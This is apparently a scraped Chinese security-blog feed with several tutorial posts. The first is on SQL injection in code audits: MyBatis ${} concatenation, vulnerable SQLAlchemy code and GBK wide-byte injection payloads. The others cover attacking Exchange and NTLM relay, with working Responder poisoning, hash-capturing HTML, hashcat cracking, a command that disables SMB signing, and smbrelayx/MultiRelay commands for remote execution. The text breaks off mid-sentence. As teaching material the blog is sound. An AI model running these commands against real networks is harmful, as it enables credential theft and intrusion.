class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testFindUserByName</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    SqlSession sqlSession=sqlSessionFactory.openSession();</span><br><span class="line">    <span class="comment">//创建UserMapper代理对象</span></span><br><span class="line">    UserMapper userMapper=sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="comment">//调⽤userMapper的⽅法</span></span><br><span class="line">    List&lt;User&gt; list=userMapper.findUserByName(<span class="string">&quot;fuckdada&#x27; and1=1#&quot;</span>);</span><br><span class="line">    sqlSession.close();</span><br><span class="line">    System.out.println(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单讲就是MyBatis有两种变量绑定⽅式，分别是：#{}和${}</p><ul><li>**#**是绑定变量的形式，底层会⽤#{}会被替换为?号，有参数映射,会在<br>DefaultParameterHandler中进⾏设置占位符的操作 –&gt;预编译</li><li>**$**也是绑定变量的形式，{value}是直接被替换为了对应的值，没有参数映射，不会进⾏设置占位<br>符的操作 –&gt;拼接</li></ul><p>很多代码审计初学者或者很多课程，上来就让去找$符号的原因</p><p>python&#x2F;flask&#x2F;sqlalchemy:<br>sqlalchemy是flask最经常配套的orm框架，在许多django项⽬中也常常看到身影。也是⽬前<br>python上⽤得最⽕的orm框架。</p><p><a href="https://blog.csdn.net/weixin_47906106/article/details/123774620">https://blog.csdn.net/weixin_47906106/article/details/123774620</a><br><a href="https://blog.csdn.net/weixin_46549605/article/details/123458430">https://blog.csdn.net/weixin_46549605/article/details/123458430</a><br><a href="https://blog.csdn.net/qq_41341757/article/details/109462158">https://blog.csdn.net/qq_41341757/article/details/109462158</a></p><p>这⾥是⼀个有注⼊漏洞的例⼦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line"> username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"> res = db.session.query(table).<span class="built_in">filter</span>(<span class="string">&quot;username=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(username))</span><br></pre></td></tr></table></figure><p>原因跟上⾯MyBatis类似，依然是⽤户输⼊其实是拼接后才导⼊sqlalchemy层的（不同层⾯组<br>件的交汇处）</p><p>正确的写法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line"> username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"> res = db.session.query(table).<span class="built_in">filter</span>(table.username == username)</span><br></pre></td></tr></table></figure><h1 id="sql注⼊到底在注⼊什么"><a href="#sql注⼊到底在注⼊什么" class="headerlink" title="sql注⼊到底在注⼊什么"></a>sql注⼊到底在注⼊什么</h1><blockquote><p>sql联合查询注⼊<br>sql堆叠注⼊<br>sql报错注⼊-N个payload<br>sql时间盲注<br>sql布尔盲注<br>sql带外数据<br>sql注⼊执⾏命令</p></blockquote><h2 id="核⼼思维"><a href="#核⼼思维" class="headerlink" title="核⼼思维"></a>核⼼思维</h2><p>sql注⼊，就是在执⾏⼀段sql语句，关键是数据库类型</p><p><strong>想法设法去执⾏⼀条完全的sql语句，把数据带出来或把命令传进去。</strong></p><p>产⽣注⼊的输⼊点:<br>输⼊点决定了我们能⽤什么样的Vector（攻击向量），以及是否需要绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $username$,password from $table$ where $username2$ = &#x27;$fuck$&#x27; order by $username3$ desc limit $0$,1</span><br></pre></td></tr></table></figure><p>每一个可输入点都又可能存在注入</p><h3 id="宽字节注⼊"><a href="#宽字节注⼊" class="headerlink" title="宽字节注⼊"></a>宽字节注⼊</h3><p>在utf-8还不那么通⽤的时候，各种⽜⻤蛇神都群魔乱舞。各种字符集都存在。（包括现在，如果你去搞⼀个jp、或者kr的站，很可能碰到其他的宽字符集）就造成了⼀种新的注⼊⽅式，叫宽字节注⼊。<br>概念</p><blockquote><p>我们知道字节是计算机存储世界中最⼩的衡量单位，1Byte &#x3D; 8bits。所以⼀个字节最⼤能够表示2^8&#x3D;256个字符。<br>所以：<br>对ascii编码⽽⾔，⼀个字符⽤⼀个字节就可以表示，所以ascii编码最多可以表示256个字符。<br>对GBK编码⽽⾔，⼀个汉字字符需要⽤两个字节表示。所以gbk编码理论上最多可以表示<br>256*256个字符。</p></blockquote><p>利⽤<br>因为宽字符的存在，导致⼀些防注⼊的⽅式会被绕过。我们以代码的形式来讲解。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$db</span> = <span class="title function_ invoke__">init_db</span>();</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(set SET NAMES <span class="string">&#x27;gbk&#x27;</span>); <span class="comment">//设置gbk字符集</span></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]); <span class="comment">//input: fuck&#x27; and 1=1#</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from table where username =&#x27;<span class="subst">$username</span>&#x27;&quot;</span>); </span><br></pre></td></tr></table></figure><p>我们来考虑下sql语句会是怎么样的呈现,输⼊fuck’ and 1&#x3D;1#</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;fuck\&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>在这种场景下，我们没办法进⾏sql注⼊，因为我们的单引号被转义了，我们没办法侵⼊到控制流去。</p><p>数据在存储的时候⼀定是以字节存储的，但是数据解读的时候，都是以字符的标准去解的。<br>所以，在连接数据库进⾏sql执⾏（执⾏就是⼀种对存储的解读）时，会按照字符集编码规范去解读，所以遇到了\xDF\x5C的时候，会解读成⼀个字符。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url输⼊--&gt;php字符串变量--&gt;addslashes--&gt;sql语句--&gt;数据库</span><br><span class="line">fuck%DF<span class="string">&#x27; and 1=1# --&gt; fuck\xDF&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment"># --&gt; fuck\xDF\&#x27; and</span></span><br><span class="line"><span class="number">1</span>=<span class="number">1</span><span class="comment"># --&gt;</span></span><br><span class="line">select * <span class="keyword">from</span> table where username = <span class="string">&#x27;fuck運&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27; //数据流成功⼊</span></span><br><span class="line">侵到控制流</span><br></pre></td></tr></table></figure><p>所以，代码审计中审阅宽字节注⼊的⽅式，就是查看数据库连接⽂件（⼀般名字类似conn.php），检查其字符集类型是什么，如果不是utf-8（因为脚本的字符集默认是utf-8）就可能有注⼊产⽣。</p><h1 id="预编译模式下的注⼊"><a href="#预编译模式下的注⼊" class="headerlink" title="预编译模式下的注⼊"></a>预编译模式下的注⼊</h1><p>还是是宽字节注⼊<br>我们先看例⼦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span> = <span class="string">&quot;mysql:host=127.0.0.1;dbname=test;charset=gbk&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$passwd</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dbs</span>, <span class="variable">$dbname</span>, <span class="variable">$passwd</span>);</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SET NAMES GBK&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from table where username =</span></span><br><span class="line"><span class="string">:username&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&quot;:username&quot;</span>,<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在这种情况下，是⽆法解决宽字符注⼊的问题的。<br>因为，在</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;prepare(<span class="string">&quot;select * from table where username =:username&quot;</span>);</span><br><span class="line">预编译后变成<span class="variable">$stmt</span>-&gt;sql = <span class="string">&quot;select * from table where username =&#x27;<span class="subst">$&#123;addslashes(<span class="variable">$input</span>)&#125;</span>&#x27;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="⽆法预编译的输⼊点"><a href="#⽆法预编译的输⼊点" class="headerlink" title="⽆法预编译的输⼊点"></a>⽆法预编译的输⼊点</h2><p><strong>like关键字</strong><br>我们知道sql语句的模糊查找⾥⾯⽤的关键字like，⽽like关键字默认是不会预编译的(如果使⽤Mybatis则是预编译报错)。数据库⽅给出的原因好像是like预编译会造成慢查询和DOS。<br>只能⼿动去添加预编译。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span>=<span class="string">&quot;mysql:host=127.0.0.1;dbname=test;&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span>=<span class="title function_ invoke__">newPDO</span>(<span class="variable">$dbs</span>, <span class="variable">$dbname</span>, <span class="variable">$passwd</span>);</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SET NAMES GBK&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from table where username like &#x27;%:username%&#x27;&quot;</span>);  <span class="comment">//不⽣效</span></span><br><span class="line"><span class="variable">$stmt</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from table where username like concat(&#x27;%&#x27;,:username,&#x27;%&#x27;&quot;</span>);  <span class="comment">//⽣效</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&quot;:username&quot;</span>,<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure><p>可能很多开发会遗漏这个点，导致存在注⼊。</p><p>或者⼀些java的开发，Mybatis编译报错，然后他们⾃⼰去添加过滤（过滤没写好）或者不过滤（使⽤原⽣语句），导致GG。</p><p>与之类似的还有IN关键字，该位置也默认不能预编译，需要在预编译语法中去for循环，有些程序员为了⽅便，可能也会在这边偷⼯减料。</p><h2 id="不能加引号的关键字"><a href="#不能加引号的关键字" class="headerlink" title="不能加引号的关键字"></a>不能加引号的关键字</h2><p>我们刚才分析了预编译模式下的宽字节注⼊，我们可以发现，预编译+绑定变量的效果，有点类似于做了两个步骤</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$newInput = addslashes($input)   <span class="comment">//内容转义</span></span><br><span class="line">sql = <span class="keyword">select</span> * from table <span class="keyword">where</span> column = <span class="string">&#x27;$newInput&#x27;</span>  <span class="comment">//强制⽤单引号包裹</span></span><br></pre></td></tr></table></figure><p>那么，结合我们刚才讲的，产⽣注⼊的输⼊点</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> <span class="variable">$username</span><span class="variable">$</span>,password from <span class="variable">$table</span><span class="variable">$</span> <span class="built_in">where</span> <span class="variable">$username2</span><span class="variable">$</span> = <span class="string">&#x27;$fuck$&#x27;</span>order by <span class="variable">$username3</span><span class="variable">$</span> <span class="variable">$desc</span><span class="variable">$</span> limit <span class="variable">$0</span><span class="variable">$</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>是否有输⼊点是必然不能加单引号的呢，如果不能加单引号，那么就不能预编译于是我们找到了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span><span class="variable">$</span>,<span class="variable">$username2</span><span class="variable">$</span>,<span class="variable">$table</span><span class="variable">$</span>,<span class="variable">$username3</span><span class="variable">$</span>,<span class="variable">$desc</span><span class="variable">$</span>,<span class="variable">$0</span><span class="variable">$</span></span><br></pre></td></tr></table></figure><p>这些地⽅都是不能加单引号的，总结就是</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表名、列名、<span class="keyword">limit</span>⼦句、<span class="keyword">order</span> <span class="keyword">by</span>[<span class="keyword">desc</span>/<span class="keyword">asc</span>`]</span><br></pre></td></tr></table></figure><p>跟刚才⼀样，可能很多开发会遗漏这个点，导致存在注⼊。</p><p>Mssql提权<br><a href="https://tttang.com/archive/1545/">https://tttang.com/archive/1545/</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动-4</title>
      <link href="/2025/06/20/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-5/"/>
      <url>/2025/06/20/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-5/</url>
      
        <content type="html"><![CDATA[<h1 id="Exchange服务"><a href="#Exchange服务" class="headerlink" title="Exchange服务"></a>Exchange服务</h1><p>Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。内网中，拿下邮件系统会对接下来的目标寻找起到关键的作用。</p><p><strong>如何攻击Exchange：</strong><br>1，漏洞利用：攻击者寻找并利用Exchange服务器中存在的漏洞。这些漏洞可能是操作系统，Exchange软件或者其他组件的安全漏洞。通过利用漏洞，攻击者可以执行恶意代码，获取未授权访问权限或篡改数据。</p><p>2，钓鱼攻击：攻击者使用欺骗性手段来诱使用户提供其Exchange凭据或敏感信息。他们可能发送伪装成合法邮件或网站的钓鱼电子邮件，诱使用户点击恶意连接或下载附件。</p><p>3，暴力破解：攻击者使用暴力破解攻击来尝试破解用户的密码。他们可能使用常见密码列表，字典文件或使用强大的计算资源进行暴力破解。</p><p>1,端口扫描<br>exchange会对外暴露接口如OWA,ECP等，会暴露在80端口，而且25&#x2F;587&#x2F;2525等端口上会有SMTP服务，所以可以通过一些端口特征来定位exchange。<br>2,SPN扫描</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -T test<span class="selector-class">.org</span> -<span class="selector-tag">q</span> /</span><br></pre></td></tr></table></figure><p>此脚本可以探测是否存在可用的cve</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> Exchange_GetVersion_MatchVul.py <span class="number">192.168.3.142</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动-4</title>
      <link href="/2025/06/19/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-4/"/>
      <url>/2025/06/19/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-4/</url>
      
        <content type="html"><![CDATA[<h1 id="横向移动-4"><a href="#横向移动-4" class="headerlink" title="横向移动-4"></a>横向移动-4</h1><p>哔哩哔哩视频：<br><a href="https://www.bilibili.com/video/BV12om2YTEgW?spm_id_from=333.788.videopod.episodes&vd_source=89bf25153801ebc942aaf90aa2af1675&p=192">https://www.bilibili.com/video/BV12om2YTEgW?spm_id_from=333.788.videopod.episodes&amp;vd_source=89bf25153801ebc942aaf90aa2af1675&amp;p=192</a><br>NTLM v1 与NTLM v2</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Net-ntlm <span class="built_in">hash</span> v1的格式为：</span><br><span class="line">username::hostname:LM response:NTLM response:challenge</span><br><span class="line"></span><br><span class="line">Net-ntlm <span class="built_in">hash</span> v2的格式为：</span><br><span class="line">username::<span class="built_in">domain</span>:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><h2 id="NTLM-Relay攻击"><a href="#NTLM-Relay攻击" class="headerlink" title="NTLM Relay攻击"></a>NTLM Relay攻击</h2><p>NTLM Relay其实严格意义上并不能叫NTLM Relay，而是应该叫 Net-NTLM Relay。它是发生在NTLM认证的第三步，在 Type3 Response消息中存在Net-NTLM Hash，当攻击者获得了Net-NTLM Hash后，可以进行中间人攻击，重放Net-NTLM Hash，这种攻击手法也就是大家所说的NTLM Relay(NTLM 中继)攻击。</p><p>进行NTML Relay攻击步骤：</p><ul><li>捕获Net-NTLM Hash</li><li>重放Net-NTLM Hash</li></ul><p>获取Net-ntlm hash<br>那第一步获取hash，这里的实现方式就是让受害者把Hash传递给自己，所以说我们可以利用所有基于Ntlm协议的上层协议进行relay，比如SMB、HTTP、LDAP协议。<br>通过Responder或者Inveigh工具<br>这两个工具的原理是LLMNR和NetBIOS欺骗。<br><a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a><br><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p><blockquote><p>LLMNR全称链路本地多播名称解析，是基于域名系统（DNS）数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。简单理解为就是一种在局域网内寻找主机的协议。</p></blockquote><blockquote><p>NetBios全称网络基本输入输出系统，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。NetBIOS也是计算机的标识名称，主要用于局域网内计算机的互访。NetBIOS的工作流程就是正常的机器名解析查询应答过程。在Windows操作系统中，默认情况下在安装TCP&#x2F;IP协议后会自动安装NetBIOS。</p></blockquote><p>Windows解析主机名的顺序为：</p><blockquote><p>1）查看本地hosts文件<br>2）查看DNS缓存或者DNS服务器中进行查找<br>3）利用LLMNR（链路本地多播名称解析）和NetBIOS名称服务进行查找</p></blockquote><p>在局域网环境下，当用户输入了一个不存在的，或者错误的，DNS中不存在的主机名的时候，Windows系统根据主机名解析的顺序开始查找，最终在局域网内广播LLMNR&#x2F;NBNS数据包来请求解析主机名。所以当我们在攻击机上进行监听，然后在被攻击机上进行广播查找，当LLMNR（链路本地多播名称解析）和NetBIOS名称服务进行查找时，我们就可以抓到被攻击机的hash。</p><h3 id="获取Net-ntlm-hash"><a href="#获取Net-ntlm-hash" class="headerlink" title="获取Net-ntlm hash"></a>获取Net-ntlm hash</h3><p><strong>Responder</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">攻击机（kali）上执行下面的命令</span></span><br><span class="line">sudo responder -I eth0  -v -F on -w on </span><br><span class="line"></span><br><span class="line">-I eth0: 指定要监听的网络接口</span><br><span class="line">-v: 输出详细的调试信息。</span><br><span class="line">-F on: 打开 NTLMv1/NTLMv2/LMv2/Fallback 密码哈希的抓取和中继功能。</span><br><span class="line">-w on: 打开 WPAD 代理欺骗功能。</span><br></pre></td></tr></table></figure><p>然后在被攻击机上访问一个不存在的主机，使得被攻击机进行广播，这里随便输一个\dddddd<br>或者在终端执行net use \dddddd，这里是利用SMB协议进行中继攻击，所以这里是SMB Relay。<br>返回kali，看到已经抓到了net-ntlm hash<br><img src="/img/image7.png" alt="alt text"></p><p>其实这里的原理是LLMNR&amp;NBNS攻击，当用户输入任意一个不存在的名称，本地hosts文件和DNS服务器均不能正常解析该名称，所以系统就会发送LLNMR&#x2F;NBNS数据包请求解析，此时Responder对目标主机进行LLNMR&#x2F;NBNS毒化，并要求其输入凭据认证，然后就可以抓到目标机器的Net-Ntlm hash。</p><p>浏览器钓鱼：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">htlm</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;\\192.168.253.255\test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在被攻击机上访问这个文件</p><p>除了上面的这些方法之外还可以用Office、PDF、outlook、WPAD欺骗、打印机漏洞等</p><h3 id="利用Net-ntlm-hash进行攻击"><a href="#利用Net-ntlm-hash进行攻击" class="headerlink" title="利用Net-ntlm hash进行攻击"></a>利用Net-ntlm hash进行攻击</h3><p>这里在我们抓到Net-NTLM Hash之后有两种利用方法，一种是利用破解软件比如hashcat去解出明文密码，一种是中继Net-NTLM Hash。</p><h4 id="破解Net-NTLM-Has"><a href="#破解Net-NTLM-Has" class="headerlink" title="破解Net-NTLM Has"></a>破解Net-NTLM Has</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 &lt;net-ntlm hash&gt; 密码字典路径 <span class="params">--force</span> <span class="params">--show</span> </span><br><span class="line"></span><br><span class="line">比如：（主要看字典强不强大）</span><br><span class="line">hashcat -m 5600  Administrator:<span class="function">:WANYUE</span><span class="function">:cc1c3f0693127e2d</span><span class="function">:F1A956FBA8F6138DD687620F161C6CDA</span><span class="function">:010100000000000054EA5D5C6D49DA0163E3AABCA31110450000000002000800420053004F00470001001E00570049004E002D005400580045004B004400310051004C0049003600570004001400420053004F0047002E004C004F00430041004C0003003400570049004E002D005400580045004B004400310051004C004900360057002E00420053004F0047002E004C004F00430041004C0005001400420053004F0047002E004C004F00430041004C000800300030000000000000000000000000300000AB1E45D172BBDC200072E4A485AB24C52F15C1CA212FB8F124D857356EFE126F0A001000000000000000000000000000000000000900120048005400540050002F0077007000610064000000000000000000</span> <span class="string">/password.txt</span> <span class="params">--force</span> <span class="params">--show</span></span><br></pre></td></tr></table></figure><p>我们抓到的这个是Net-NTLM Hash v2，密码强度较高，一般都跑不出来，所以基本都是用中继攻击。</p><h4 id="中继Net-NTLM-Hash"><a href="#中继Net-NTLM-Hash" class="headerlink" title="中继Net-NTLM Hash"></a>中继Net-NTLM Hash</h4><p>我们知道，由于NTLM只是底层的认证协议，必须镶嵌在上层应用协议里面，消息的传输依赖于使用NTLM的上层协议，比如SMB、HTTP、LDAP等。因此，我们可以将获取到的Net-NTLM Hash Relay到其他使用NTLM进行认证的应用上。<br>这个攻击有个前提：</p><blockquote><p>目标主机没有开启smb签名。这里说一下，一般情况下域控默认开启smb签名，其余域内机器不开启。关闭SMB签名的命令如下：</p></blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f</span></span><br></pre></td></tr></table></figure><p>用nmap探测SMB签名是否打开命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p445 --script=smb-security-mode.nse -Pn IP --open</span><br></pre></td></tr></table></figure><h5 id="SMB中继"><a href="#SMB中继" class="headerlink" title="SMB中继"></a>SMB中继</h5><p>SMB 中继是最直接最有效的方法。可以直接控制该服务器 (包括但不限于在远程服务器上执行命令、上传 exe 到远程主机上执行、dump 服务器的用户 hash 等等)。</p><p>中继的前提是目标 SMB 签名需要关闭，在 SMB 连接中，需要使用安全机制来保护服务器和客户端之间传输数据的完整性，而这种安全机制就是 SMB 签名和加密，如果关闭 SMB 签名，会允许攻击者拦截认证过程，并且将获得 hash 在其他机器上进行重放，从而获得权限。</p><p><strong>impacket下的smbrelayx.py</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在VPS(192.168.253.129)上执行如下命令，攻击192.168.253.128主机，并执行 <span class="built_in">whoami</span>命令，会监听本地80和445 端口，伪造 http 和 smb 服务</span></span><br><span class="line"></span><br><span class="line">python3 smbrelayx.py -h 192.168.253.128 -c whoami</span><br></pre></td></tr></table></figure><p>让任意主机访问这个攻击者精心构造好的 SMB 服务器：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">net</span> <span class="keyword">use</span> \\&lt;kali IP&gt;</span><br></pre></td></tr></table></figure><p>此时，攻击者的 smbrelayx 脚本上就会发现命令成功执行了</p><p><strong>responder MultiRelay</strong><br>利用 MultiRelay.py 攻击，获得目标主机的 shell：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> MultiRelay.<span class="keyword">py</span> -t &lt;被攻击ip&gt; -<span class="keyword">u</span> ALL</span><br></pre></td></tr></table></figure><p>现在 SMB 已经由 MultiRelay.py 脚本来进行中继，我们需要修改一下 responder 的配置文件Responder.conf，不让其对 hash 进行抓取。将 SMB 和 HTTP 的 On 改为 Off：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/responder/Responder.conf</span><br><span class="line"></span><br><span class="line">SMB=Off</span><br><span class="line">HTTP=Off</span><br></pre></td></tr></table></figure><p>重启 Responder.py，准备毒化（这里 responder 的作用就是当访问一个不存在的共享路径，将称解析降到 LLMNR&#x2F;NBNS 时，来抓取网络中所有的 LLMNR 和 